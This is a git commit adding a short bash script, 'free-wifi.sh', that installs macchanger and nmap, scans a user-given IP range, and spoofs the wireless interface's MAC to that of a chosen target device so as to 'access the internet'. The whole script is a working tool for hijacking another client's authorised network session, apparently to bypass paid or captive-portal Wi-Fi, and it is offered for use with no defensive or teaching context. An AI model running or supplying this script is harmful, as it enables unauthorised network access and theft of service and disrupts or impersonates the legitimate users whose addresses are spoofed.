2bd7064aacd25975a1789cf2df88a822a1de291b
mcgregol <47013839+mcgregol@users.noreply.github.com>
2020-07-29 22:23:10 -0400

    Add files via upload

---
+++ free-wifi.sh
@@ -0,0 +1,53 @@
+#! /bin/bash
+
+clear
+
+echo ++++++++++++++++++++++++
+
+echo
+
+echo   MUST BE RUN AS ROOT
+
+echo
+
+echo ++++++++++++++++++++++++
+
+sleep 1
+
+echo Checking requirements...
+
+pacman -S macchanger nmap
+
+clear
+
+read -p "Enter wireless interface: " interface
+
+clear
+
+read -p "Enter IP range to scan: " range
+
+echo
+
+echo Scanning...
+
+sleep 2
+
+nmap -sP $range
+
+echo
+
+read -p "Enter target MAC address: " target
+
+clear
+
+echo Spoofing MAC...
+
+sleep 2
+
+echo 
+
+macchanger -m $target $interface
+
+echo 
+
+echo Done! Now you can access the internet.
